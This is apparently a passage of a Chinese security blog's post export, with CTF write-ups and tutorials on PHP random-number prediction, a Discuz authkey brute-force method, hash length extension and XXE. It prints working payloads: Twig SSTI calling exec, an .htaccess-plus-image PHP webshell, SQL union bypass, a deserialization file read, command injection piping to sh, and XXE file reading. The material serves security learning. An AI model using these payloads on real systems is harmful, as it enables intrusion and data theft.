https://www.freebuf.com/articles/web/137923.html","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"bypass","slug":"bypass","permalink":"http://www.moonback.xyz/tags/bypass/"},{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"},{"name":"命令执行","slug":"命令执行","permalink":"http://www.moonback.xyz/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"php伪随机数","slug":"php-fakerandom-number","date":"2019-12-30T06:43:45.000Z","updated":"2020-04-29T14:51:52.015Z","comments":true,"path":"2019/12/30/php-fakerandom-number/","link":"","permalink":"http://www.moonback.xyz/2019/12/30/php-fakerandom-number/","excerpt":"本篇博客主要介绍了php伪随机数的相关内容！！！","text":"本篇博客主要介绍了php伪随机数的相关内容！！！ 相关函数mt_rand()mt_rand函数有两个可选参数 min 和 max，如果没有提供可选参数，mt_rand函数将返回返回 0 到 mt_getrandmax() 之间的伪随机数。例如想要 5 到 15（包括 5 和 15）之间的随机数，用 mt_rand(5, 15)。 mt_srand()用于播下一个更好的随机数发生器种子，用 seed 来给随机数发生器播种。 没有设定 seed 参数时，会被设为随时数。自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 给随机数发生器播种 ，因为现在是由系统自动完成的。 这张图感觉挺好的 一个题目1234567891011121314151617 &lt;?php show_source(__FILE__); include &quot;flag.php&quot;; $a = @$_REQUEST[&#x27;hello&#x27;]; $seed = @$_REQUEST[&#x27;seed&#x27;]; $key = @$_REQUEST[&#x27;key&#x27;]; mt_srand($seed); $true_key = mt_rand(); if ($key == $true_key)&#123; echo &quot;Key Confirm&quot;; &#125; else&#123; die(&quot;Key Error&quot;); &#125; eval( &quot;var_dump($a);&quot;);?&gt; 可以看出来这个题目传了三个参数，seed可控，因此我们只需在phpstudy选择相同的php版本设定相同的seed，输出产生的随机数就行 php版本差别php5和php7会用不同的算法来生成随机数，所以即使seed相同生成的随机数也不相同 php_mt_seedphp_mt_seed是一个破解mt_rand函数seed的工具，在最简单的调用模式下，它能通过mt_rand第一次输出的值寻找mt_rand的seed，在更高级的模式中它能匹配不是第一次输出的和不明确具体输出的情况。 p_mt_seed基于命令行运行，命令行可以使用1，2，4或者更多的参数。这些参数需要详细说明mt_rand()的输出。 12git clone https://github.com/lepiaf/php_mt_seed.gitmake 4.0版本从这里下载：https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz 一个参数当只有一个参数的时候，这个参数代表mt_rand第一次输出的值。 两个参数当有两个参数的时候，他们代表mt_rand第一次输出应该位于什么区间内。 第一个参数为最小值，第二个参数为最大值。 四个参数（高级模式）前两个参数表示mt_rand输出的值，后两个参数表示mt_rand输出的区间(从0开始)。 多于五个参数（高级模式）每四个参数一组，但是最后一组可以是1，2或4个参数，按照上面的格式。 详细使用参见：https://www.openwall.com/php_mt_seed/README 简单使用这里用的是php7.0 假设有这样一个生成随机序列的算法，生成了下图的随机数 12345678910111213141516&lt;?phpfunction user_password($length = 10) &#123; $allowable_characters = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $len = strlen($allowable_characters) - 1; $pass = &#x27;&#x27;; for ($i = 0; $i &lt; $length; $i++) &#123; $pass .= $allowable_characters[mt_rand(0, $len)]; &#125; return $pass; &#125; mt_srand(time()); echo user_password(), &quot;\\n&quot;; echo user_password(), &quot;\\n&quot;; echo user_password(), &quot;\\n&quot;; ?&gt; 写一个程序来转换生成的随机数 12345s=&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;pwd=&quot;UHsI89HQVr&quot;for i in pwd: print(str(s.index(i))+&quot; &quot;+str(s.index(i))+&quot; 0 61 &quot;,end=&quot;&quot;)//结果：46 46 0 61 33 33 0 61 18 18 0 61 34 34 0 61 60 60 0 61 61 61 0 61 33 33 0 61 42 42 0 61 47 47 0 61 17 17 0 61 然后我们验证一下用爆破出来的seed是否能生成相同的序列 可以看到成功实现 Discuz X3.3 authkey生成算法漏洞用户在初次安装软件时，系统会自动生成一个authkey写入全局配置文件和数据库，之后安装文件会被删除。该authkey用于对普通用户的cookie进行加密等密码学操作，但是由于生成算法过于简单，可以利用公开信息进行本地爆破。authkey生成算法位于Discuz_X3.3_SC_UTF8/upload/install/index.php中 authkey的生成方法如下： 1$authkey = substr(md5($_SERVER[&#x27;SERVER_ADDR&#x27;].$_SERVER[&#x27;HTTP_USER_AGENT&#x27;].$dbhost.$dbuser.$dbpw.$dbname.$username.$password.$pconnect.substr($timestamp, 0, 6)), 8, 6).random(10); 可以看出authkey主要由两部分组成： MD5的一部分（前6位） + random生成的10位 跟入random函数 12345678910function random($length) &#123; $hash = &#x27;&#x27;; $chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#x27;; $max = strlen($chars) - 1; PHP_VERSION &lt; &#x27;4.2.0&#x27; &amp;&amp; mt_srand((double)microtime() * 1000000); for($i = 0; $i &lt; $length; $i++) &#123; $hash .= $chars[mt_rand(0, $max)]; &#125; return $hash;&#125; 由于字符生成集合是固定的，且没有重复字符，那么函数中每一次生成hash都唯一对应了chars数组中的一个位置，而且是使用同一个seed生成的。 在之后的代码中使用了同样的random函数： 1$_config[&#x27;cookie&#x27;][&#x27;cookiepre&#x27;] = random(4).&#x27;_&#x27;; Cookie的前四个字节是已知的，并且使用了同样的random函数，那么思路很明显： 通过已知的4位，算出random使用的种子，进而得到authkey后10位。那剩下的就需要搞定前6位，根据其生成算法，只好选择爆破的方式，由于数量太大，就一定要选择一个本地爆破的方式（即使用到authkey而且加密后的结果是已知的）。 在调用authcode函数很多的地方都可以进行校验，在这里使用找回密码链接中的id和sign参数： sign生成的方法如下： 123function dsign($str, $length = 16)&#123; return substr(md5($str.getglobal(&#x27;config/security/authkey&#x27;)), 0, ($length ? max(8, $length) : 16));&#125; 爆破authkey 的流程： 通过cookie前缀爆破随机数的seed。使用php_mt_seed工具。 用seed生成random(10)，得到所有可能的authkey后缀。 给自己的账号发送一封找回密码邮件，取出找回密码链接。 用生成的后缀爆破前6位，范围是0x000000-0xffffff，和找回密码url拼接后做MD5求出sign。 将求出的sign和找回密码链接中的sign对比，相等即停止，获取当前的authkey。 mt_rand()的一种新思路参见Hgame上面的一道题：https://www.moonback.xyz/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/#%E4%BA%8C%E5%8F%91%E5%85%A5%E9%AD%82%EF%BC%81 rand()函数安全后来了解到这个函数在某些条件下生成的随机数也是可以预测的 先说下在linux下，PHP rand函数在底层使用的是glibc rand()，它会保留前面生成随机数的数据，作为后面随机数生成的依据，以此保证伪随机数的均匀性，但这样会导致严重的安全问题，也就是如果我们知道前面生成的随机序列，那么完全可以预测后面的随机数，公式： 1num[n] = (num[n-3] + num[n-31]) mod (MAX) 举个例子： 12345678910&lt;?php$num = array();//生成50个伪随机数for ($i=0; $i &lt; 50; $i++) &#123; $num[$i] = rand(0,100000);&#125;for ($i=31; $i &lt; 50; $i++)&#123;echo &quot;第&quot;.($i+1).&quot;个随机数：&quot;.$num[$i].&quot;\\t&quot;.&quot;向前数第三个数：&quot;.$num[$i-31].&quot;\\t向前数第31个数：&quot;.$num[$i-3].&quot;\\t%计算后:&quot;.(($num[$i-31]+$num[$i-3])%100000).&quot;\\n&quot;;&#125;?&gt; 可以看到虽然有可能有误差，但误差都为1，gtfly大佬给的提示可以能精度的问题感觉很对 再看一下windows，是无法用上面的方式预测的，但是可以爆破 详细看：https://github.com/Sjord/crack-ezchatter-token 参考： https://www.freebuf.com/vuls/192012.html https://blog.cfyqy.com/article/5aa79cea.html https://xz.aliyun.com/t/31 http://wonderkun.cc/index.html/?p=585 https://xz.aliyun.com/t/1520#toc-10","categories":[],"tags":[{"name":"php","slug":"php","permalink":"http://www.moonback.xyz/tags/php/"},{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"},{"name":"伪随机数","slug":"伪随机数","permalink":"http://www.moonback.xyz/tags/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"}]},{"title":"河南省第一届金盾杯部分题目writeup","slug":"jindun-2019-wp","date":"2019-12-24T03:06:26.000Z","updated":"2020-05-09T12:55:36.011Z","comments":true,"path":"2019/12/24/jindun-2019-wp/","link":"","permalink":"http://www.moonback.xyz/2019/12/24/jindun-2019-wp/","excerpt":"太菜了！全程懵逼，啥都没干！2333。。。记录下吧！收获很多！","text":"太菜了！全程懵逼，啥都没干！2333。。。记录下吧！收获很多！ webwaimai2打开发现好像一个站，有waimai这个目录，访问发现是个登录框 任意账号都可以登进去，Twig模板注入(是时候学下SSTI了)，payload： 1username&#x3D;&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;ls&quot;)&#125;&#125;&amp;password&#x3D;admin&amp;submit&#x3D;Login misckey不在这里二维码，扫描，发现是个bing的搜索网址 将m参数10进制转ascii字符就行 从娃娃抓起120086 1562 2535 5174bnhn s wwy vffg vffg rrhy fhnv 提示说flag为将得到的这句话MD5 32位加密的内容 前一段是中文电报码：解密网址，解出人工智能 后一段是五笔字，解出来的结果是也要从娃娃抓起，在线五笔输入：网址 然后MD5加密就可以得到flag Hashcat给了一个不知道是啥的文件，多试几次吧，发现是pptx，有密码，用aopr破解 破解出密码是9919，打开，发现第七页有文本框 改下字体颜色，出现flag 我吃三明治题目是一张jpg图片，用hxd或者strings发现串特殊的字符串 base32解密得到flag cryptoapple给了一段像base64的东西，TkVLTFccSx1RAwFWDVcFDg0NAwIIWAZccyRzcydzIHUuKHxyLjA=，直接解码会乱码 脚本意思就是将解出来的乱码与自己的下标加上某个值异或，然后拼接 123456789101112import base64s&#x3D;&#39;TkVLTFccSx1RAwFWDVcFDg0NAwIIWAZccyRzcydzIHUuKHxyLjA&#x3D;&#39;s&#x3D;base64.b64decode(s)for i in range(256): flag&#x3D;&quot;&quot; k&#x3D;0 for j in s: res&#x3D;j^(k+i) flag+&#x3D;chr(res) k+&#x3D;1 print(i,flag) 密码学附件给了三段密码，clear_info.txt crypt_info.txt true_crypto.txt，true_crypto.txt内容像是DES密码 发现clear_info.txt和crypt_info.txt内容长度相同都为79，试试异或吧 123456789101112131415161718s1&#x3D;open(&quot;clear_info.txt&quot;,&quot;r&quot;).read()s2&#x3D;open(&quot;crypt_info.txt&quot;,&quot;r&quot;).read()flag&#x3D;&quot;&quot;li1&#x3D;[i for i in s1]li2&#x3D;[i for i in s2]for s1,s2 in zip(li1,li2): s&#x3D;ord(s1)^ord(s2) flag+&#x3D;chr(s)print(flag)fg&#x3D;&quot;&quot;for tr in flag: if tr&lt;&#x3D;&quot;Z&quot; and tr&gt;&#x3D;&quot;A&quot;: fg+&#x3D;&quot;A&quot; elif tr&lt;&#x3D;&quot;z&quot; and tr&gt;&#x3D;&quot;a&quot;: fg+&#x3D;&quot;B&quot; else: fg+&#x3D;&quot;&quot;print(fg) 异或后的结果大小写交叉，试试培根密码吧 解密地址：网址，解密结果为：DESISAMUSING Des解下密，解密地址：网址 bj-密文打开发现是 45 45 45 45 45 32 45 46 46 45 32 45 45 46 46 46 32 46 46 46 45 45 32 45 45 46 46 46 32 45 45 45 45 46 32 45 46 46 46 46 32 46 32 45 45 46 46 46 32 46 46 46 46 45 32 45 45 46 46 46 32 45 46 46 46 32 45 46 46 46 46 32 46 45 32 46 46 46 46 45 32 45 45 45 46 46 32 46 46 46 46 45 32 45 45 45 46 46 32 46 46 46 45 45 32 46 46 46 45 45 32 45 46 46 46 46 32 45 46 46 46 32 46 46 46 46 45 32 46 32 46 46 46 46 46 32 45 46 46 46 46 32 46 46 46 46 45 32 45 46 46 32 46 46 46 46 45 32 45 46 46 32 46 46 46 46 46 32 45 45 46 46 46 32 46 46 46 45 45 32 46 46 46 45 45 32 45 46 46 46 46 32 45 46 46 46 46 32 46 46 46 45 45 32 45 45 45 45 45 32 46 46 46 46 45 32 46 46 45 45 45 32 45 46 46 46 46 32 46 46 46 45 45 32 45 46 46 46 46 32 46 45 45 45 45 32 45 45 46 46 46 32 45 46 46 只有45，46，32三种数字而其对应的ASCII码正是- . 脚本替换就好 12345s&#x3D;open(&quot;bj.txt&quot;,&quot;r&quot;).read()flag&#x3D;&quot;&quot;for tr in s.split(&quot; &quot;): flag+&#x3D;chr(int(tr))print(flag) 得到摩斯密码，解密得到0X73796E747B6A4848336B4E564D4D573366304263617D，应该是16进制，16进制转字符试试，得到synt&#123;jHH3kNVMMW3f0Bca&#125;，然后是凯撒移位加密，密码为13得到flag，flag&#123;wUU3xAIZZJ3s0Opn&#125; 小明的生日给了个MD5，0175501585710a89h5a60dc9ed2f88d7，解不出来，提示说是生日，并且前四位是1997， 写个脚本跑下吧 12345678910111213141516171819202122232425262728import hashlibimport difflibflag&#x3D;&quot;0175501585710a89h5a60dc9ed2f88d7&quot;def md5(key): m &#x3D; hashlib.md5() m.update(key.encode(&#39;utf-8&#39;)) return m.hexdigest()dic&#x3D;&#123;&#125;birthday&#x3D;&#39;1997&#39;for i in range(1,13): for j in range(1,32): s1&#x3D;&quot;&quot; s2&#x3D;&quot;&quot; if i&lt;10: s1&#x3D;&#39;0&#39;+str(i) else: s1&#x3D;str(i) if j&lt;10: s2&#x3D;&#39;0&#39;+str(j) else: s2&#x3D;str(j) bit&#x3D;birthday+s1+s2 dic[bit]&#x3D;difflib.SequenceMatcher(None, flag,md5(bit)).quick_ratio()for k in sorted(dic,key&#x3D;dic.__getitem__,reverse&#x3D;True): print(k,dic[k]) 第一个就是最相似的md5","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"},{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"}]},{"title":"GXY安恒杯月赛2019部分题目writeup","slug":"gxy-2019-wp","date":"2019-12-21T13:43:34.000Z","updated":"2020-05-16T08:12:31.326Z","comments":true,"path":"2019/12/21/gxy-2019-wp/","link":"","permalink":"http://www.moonback.xyz/2019/12/21/gxy-2019-wp/","excerpt":"我好菜！我好菜！我好菜！重要的事情说三遍，比赛收获很多！！！总结一下，收获了大型比赛的一血，但也就正儿八经的做出这一道！2333….","text":"我好菜！我好菜！我好菜！重要的事情说三遍，比赛收获很多！！！总结一下，收获了大型比赛的一血，但也就正儿八经的做出这一道！2333…. web禁止套娃！之前做过这种类型，脑子混了！哎！ WP参见：http://www.moonback.xyz/2019/11/12/php-nopara-rce/#GXY-安恒月赛 babyupload这题就是我拿到一血的题目，小开心！嘻嘻嘻！ 其实这题不难，MIME+.htaccess+检测内容php bp开两个intruder，一个上传.htaccess(注意MIME)，一个上传图片马(检查&lt;?php?&gt;)，后台会删除上传的文件，所以条件竞争，然后蚁剑连就行 .htaccess 123&lt;FilesMatch &quot;jpg|png|gif&quot;&gt; SetHandler application&#x2F;x-httpd-php &lt;&#x2F;FilesMatch&gt; 图片马： 12GIF89a&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;a&#x27;]);&lt;/script&gt; BabySqli查看源代码，发现特殊字符串，先base32解密，再base64解密得到： 1select * from user where username = &#x27;$name&#x27; 告诉我们数据库为user，列有username这列，猜测password的验证是和username分离的 先fuzz一下sql关键字 发现过滤了小括号，or,order,=,for,information 后来看了wp才知道，过滤在sql之后，其实也能试出来，下图成功延时 这样就相当于没过滤啊，直接sqlmap一把梭，能跑出账号的MD5，但是解不出来 既然是password的验证时分离的，我们完全可以伪造一个用户，上面跑不跑无所谓 用union查询就行，注意列要对应，payload，md5为123456加密后的值： 1name&#x3D;&#39;union select 1,&quot;admin&quot;,&quot;e10adc3949ba59abbe56e057f20f883e&quot;%23&amp;pw&#x3D;123456 为啥可以这样？ 后端将接收到的password md5加密与上次查询的结果比较，我们就可以联合查询伪造一个用户进行绕过 无情的报菜名机器反序列化，dirsearch扫到index.php~ 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?php class FileReader&#123; public $Filename; public $start; public $max_length; function __construct()&#123; $this-&gt;Filename = __DIR__ . &quot;/bcm.txt&quot;; $this-&gt;start = 12; $this-&gt;max_length = 72; &#125; function __wakeup()&#123; $this-&gt;Filename = __DIR__ . &quot;/fake_f1ag.php&quot;; $this-&gt;start = 10; $this-&gt;max_length = 0; echo &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;; &#125; function __destruct()&#123; $data = file_get_contents($this-&gt;Filename, 0, NULL, $this-&gt;start, $this-&gt;max_length); if(preg_match(&quot;/\\&#123;|\\&#125;/&quot;, $data))&#123; die(&quot;you can&#x27;t read flag!&quot;); &#125; else&#123; echo $data; &#125; &#125;&#125;if(isset($_GET[&#x27;exp&#x27;]))&#123; if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#x27;exp&#x27;]))&#123; die(&quot;hack!&quot;); &#125; $exp = $_REQUEST[&#x27;exp&#x27;]; $e = unserialize($exp); echo $e-&gt;Filename;&#125;else&#123; $exp = new FileReader();&#125;?&gt; 首先要绕过对exp的正则，发现exp可以通过POST提交过去，很容易绕过，其次要绕过__wakeup函数，这个直接改下数字大小就行，读文件的时候可以用php://filter进行加密绕过对&#123;&#125;的过滤 payload: http://183.129.189.60:10004/index.php?exp=1 POST:exp=O:10:&quot;FileReader&quot;:4:&#123;s:8:&quot;Filename&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;s:5:&quot;start&quot;;i:0;s:10:&quot;max_length&quot;;i:1000;&#125; I can ping you!题目是看不到源码的，咱们直接拿源码来看 123456789101112131415161718192021&lt;?phpif(isset($_GET[&#x27;ip&#x27;]))&#123;$ip = $_GET[&#x27;ip&#x27;];if(preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;1f&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match))&#123; echo preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match); die(&quot;fxck your symbol!&quot;);&#125;else if(preg_match(&quot;/ /&quot;, $ip))&#123; die(&quot;fxck your space!&quot;);&#125;else if(preg_match(&quot;/bash/&quot;, $ip))&#123; die(&quot;fxck your bash!&quot;);&#125;else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123; die(&quot;fxck your flag!&quot;);&#125;$a = shell_exec(&quot;ping -c 4 &quot;.$ip);echo &quot;&lt;pre&gt;&quot;;print_r($a);&#125;?&gt; 过滤了一大堆东西 payload: 1?ip=;cat$IFS`ls` 或者 1?ip=||echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh Y2F0IGZsYWcucGhw是cat flag.php的意思 misc佛系青年这题直接binwalk压缩包会卡住，敲下回车就行，分离出三个文件 fo.txt里面有与佛论禅加密，拿到这里解密一下就可以得到flag 其实这题的真正考点是zip伪加密，用binwalk分离出的0.zip是经过zip伪加密的，我是用的winrar修复的，比对一下两个文件，发现只有一处不同，即全局方式位标记不同(用于区分是否有加密)，00 00代表无加密，00 09代表有加密，因此也可以手动修改，关于zip伪加密的，参见：link gakki解压发现是一张图片，binwalk一下，分离出压缩包 是有加密的，没什莫思路，是不是简单的密码？试试呗 密码为8864，打开flag.txt发现好像乱码的东西 神魔加密呢？不算是加密 这些字符其实是由flag的内容，顺序是按照出现的次数从大到小排序，上脚本吧 1234567fp=open(&#x27;flag.txt&#x27;,&#x27;r&#x27;).read()print(fp)dic=&#123;&#125;for tr in fp: dic[tr]=fp.count(tr)for k in sorted(dic,key=dic.__getitem__,reverse=True): print(k,end=&quot;&quot;) 人生苦短我用python SXMgdGhpcyBiYXNlPw==本题是base64隐写，题目内容 关于base64隐写的内容，参见这位大佬的blog 这道题直接用脚本跑就行 123456789101112import base64bin_str=&#x27;&#x27;b64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;with open(&#x27;code.txt&#x27;,&#x27;r&#x27;) as f: for line in f.readlines(): stegb64=&quot;&quot;.join(line.split()) rowb64=&quot;&quot;.join(str(base64.b64encode(base64.b64decode(stegb64)),&#x27;utf-8&#x27;).split()) offset=abs(b64chars.index(stegb64.replace(&#x27;=&#x27;,&#x27;&#x27;)[-1])-b64chars.index(rowb64.replace(&#x27;=&#x27;, &#x27;&#x27;)[-1])) equalnum=line.count(&#x27;=&#x27;) if equalnum: bin_str += bin(offset)[2:].zfill(equalnum * 2) print(&#x27;&#x27;.join([chr(int(bin_str[i:i + 8], 2)) for i in range(0,len(bin_str),8)]))","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"},{"name":"GXY","slug":"GXY","permalink":"http://www.moonback.xyz/tags/GXY/"}]},{"title":"哈希扩展长度攻击学习","slug":"hash-extend-attack","date":"2019-12-16T11:28:59.000Z","updated":"2020-04-23T07:20:13.665Z","comments":true,"path":"2019/12/16/hash-extend-attack/","link":"","permalink":"http://www.moonback.xyz/2019/12/16/hash-extend-attack/","excerpt":"本篇博客主要介绍了hash扩展长度攻击主要方式及原理！！！","text":"本篇博客主要介绍了hash扩展长度攻击主要方式及原理！！！ hash原理 首先，当hash函数拿到需要被hash的字符串后，先将其字节长度整除64，取得余数。如果该余数正好等于56，那么就在该字符串最后添加上8个字节的长度描述符（具体用bit表示）。如果不等于56，就先对字符串进行长度填充，填充时第一个字节为hex(80)，其他字节均用hex(00)填充，填充至余数为56后，同样增加8个字节的长度描述符（该长度描述符为需要被hash的字符串的长度，不是填充之后整个字符串的长度）。以上过程，称之为补位。 补位完成后，字符串以64位一组进行分组（因为上面的余数为56,加上8个字节的长度描述符后，正好是64位，凑成一组）。字符串能被分成几组就会进行多少次“复杂的数学变化”。每次进行“复杂的数学变化”都会生成一组新的registers值供下一次“复杂的数学变化”来调用。第一次“复杂的数学变化”会调用程序中的默认值。当后面已经没有分组可以进行数学变化时，该组生成的registers值就是最后的hash值。 为确保同一个字符串的hash值唯一，所以需要保证第一次registers的值也唯一。所以在hash算法中，registers具有初始值。如上图中的registers值0。 md5的加密过程总体思路MD5加密过程中512比特（64字节）为一组，属于分组加密，而且在运算的过程中，将512比特分为32bit*16块，分块运算 我们关键利用的是MD5的填充，对加密的字符串进行填充(比特第一位为1其余比特为0)，使之(二进制)补到448模512同余，即长度为512的倍数减64，最后的64位在补充为原来字符串的长度，这样刚好补满512位的倍数，如果当前明文正好是512bit倍数则再加上一个512bit的一组。 MD5不管怎么加密，每一块加密得到的密文作为下一次加密的初始向量IV，这一点很关键！！！ 补位举个例子：假设我们要对某个字符串MD5加密，首先先转换成16进制 注意：字符是以ASCII码存在的，ASCII码转换成二进制数存在，每个字符相当于一字节(1byte)即8位(8bit) 而MD5加密的过程中会判断len(message) % 512bit是否为448bit。如果是的话，就在后面填充8个字节(64bit)的长度描述符，如果不是，则在其后面填充hex(80)即而进行二进制的100000000，然后再填充hex(00)直到长度%512bit=448bit，然后就是填充8个字节的长度描述符 补长度长度描述符的填充内容即为原加密字符串的的bit长度，例如示例是4个字节，32bit，对应16进制就是0x0000000000000020，由于填充时是小端序放的，那么填充的数据将会是小端序存放的，即0x2000000000000000 计算消息摘要计算消息摘要必须用补位已经补长度完成之后的消息来进行运算，拿出 512 bit的消息（即64字节）。 计算消息摘要的时候，有一个初始的链变量，用来参与第一轮的运算。MD5 的初始链变量为： 1234A&#x3D;0x67452301 B&#x3D;0xefcdab89 C&#x3D;0x98badcfe D&#x3D;0x10325476 （注意这里这4个值是在md5算法中写死的，写死的。。。。）我们不需要关心计算细节，我们只需要知道经过一次消息摘要后，上面的链变量将会被新的值覆盖，而最后一轮产生的链变量经过高低位互换（如：aabbccdd -&gt; ddccbbaa）后就是我们计算出来的 md5 值。 攻击方式hash长度扩展的大概意思就是： 已知secret长度，data值，以及secret+data的hash值，就可以求出secret+其他数据的hash值 HashPumpHashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。而MD2、SHA224和SHA384算法不受此攻击的影响，因其部分避免了对状态变量的输出，并不输出全部的状态变量。 安装步骤： 1234git clone https://github.com/bwall/HashPumpapt-get install g++ libssl-devcd HashPumpmake CTF题目实验吧源码： 12345678910111213141516171819202122&lt;?phperror_reporting(0);include(&#x27;flag.php&#x27;);setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));// This secret is 15 characters long for security!$username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];if (!empty($_COOKIE[&quot;getmein&quot;])) &#123; if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) &#123; if ($_COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) &#123; echo &quot;Congratulations! You are a registered user.\\n&quot;; die (&quot;The flag is &quot;. $flag); &#125; else &#123; die (&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;); &#125; &#125; else &#123; die (&quot;You are not an admin! LEAVE.&quot;); &#125;&#125;highlight_file(__FILE__); 抓包在Cookie里我们看到了$secret+&#39;adminadmin&#39;的MD5值，现在我们只需要求$secret+&#39;admin&#39;+其他值的MD5值就能得到flag，已知$secret长度为15，加上admin长度为20，此时我们就能用hashpump 还可以直接用命令行形式 1hashpump -s 49848099cde7e537e5fe4d88d0ba90f8 -d admin -k 20 -a moonback 把\\x替换成% 可以看到成功得到flag JarvisOJhttps://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#flag在管理员手里 NPUCTF参见:http://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#flag%E5%9C%A8%E7%AE%A1%E7%90%86%E5%91%98%E6%89%8B%E9%87%8C 参考： https://blog.blacsheep.cn/2017/12/10/md5长度扩展攻击/ https://gtfly.github.io/2019/03/21/Hash长度扩展攻击学习/","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://www.moonback.xyz/tags/ctf/"},{"name":"hash","slug":"hash","permalink":"http://www.moonback.xyz/tags/hash/"}]},{"title":"XXE学习","slug":"xxe-study","date":"2019-12-14T11:52:03.000Z","updated":"2021-04-17T15:40:00.790Z","comments":true,"path":"2019/12/14/xxe-study/","link":"","permalink":"http://www.moonback.xyz/2019/12/14/xxe-study/","excerpt":"本篇博客简单介绍了XXE漏洞的原理和常见利用方式！！！","text":"本篇博客简单介绍了XXE漏洞的原理和常见利用方式！！！ 什么是XXE?XXE漏洞全称XML External Entity Injection，即xml外部实体注入漏洞 有可能造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害 xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件 XXE漏洞代码以buuoj上Real部分[PHP]XXE为例，上面有三个文件： simplexml_load_string.php： 12345&lt;?php$data = file_get_contents(&#x27;php://input&#x27;);$xml = simplexml_load_string($data);echo $xml-&gt;name; SimpleXMLElement.php： 12345&lt;?php$data = file_get_contents(&#x27;php://input&#x27;);$xml = new SimpleXMLElement($data);echo $xml-&gt;name; dom.php: 1234567&lt;?php$data = file_get_contents(&#x27;php://input&#x27;);$dom = new DOMDocument();$dom-&gt;loadXML($data);print_r($dom); 我们可以构造下面的payload: 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=/var/www/html/dom.php&quot; &gt;]&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt; XML了解XXE一定要了解XML一些经常使用的语法！ XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。 12345678910111213141516&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; &lt;!--XML申明--&gt;&lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt; &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义note元素有四个元素--&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义to元素为”#PCDATA”类型--&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义from元素为”#PCDATA”类型--&gt; &lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义head元素为”#PCDATA”类型--&gt; &lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义body元素为”#PCDATA”类型--&gt;]&gt;&lt;!--文档元素--&gt;&lt;note&gt;&lt;to&gt;Mooback&lt;&#x2F;to&gt;&lt;from&gt;Moonback&lt;&#x2F;from&gt;&lt;head&gt;XXE&lt;&#x2F;head&gt;&lt;body&gt;I am learning XML.&lt;&#x2F;body&gt;&lt;&#x2F;note&gt; 用浏览器打开可以看到 DTD实体实体是对数据的引用。 实体可在内部或外部进行声明，一般分为字符实体，命名实体，外部实体，参数实体，所有实体（除参数实体外）都以一个与字符（&amp;）开始，以一个分号（;）结束。 字符实体： 对于字符实体，我们可以用十进制格式（&amp;#nnn;，其中 nnn 是字符的十进制值）或十六进制格式（&amp;#xhhh;，其中hhh 是字符的十六进制值）来指定任意 Unicode 字符。 举个例子：大写字母 A 是 Unicode 字符 